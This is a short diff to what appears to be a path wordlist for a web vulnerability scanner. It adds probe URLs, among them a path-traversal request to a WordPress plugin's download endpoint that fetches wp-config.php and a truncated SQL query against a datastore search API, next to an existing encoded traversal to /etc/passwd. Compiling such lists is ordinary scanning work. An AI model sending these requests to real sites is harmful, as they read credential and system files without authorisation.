@@ -368,3 +368,6 @@
 /plugins/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 /project/default
 /api/platform/profile
+/wp-json/wooconvo/v1/download-file?order_id=1&filename=../../../../wp-config.php
+/api/action/status_show
+/api/action/datastore_search_sql?sql=SELECT+ts_rewrite(
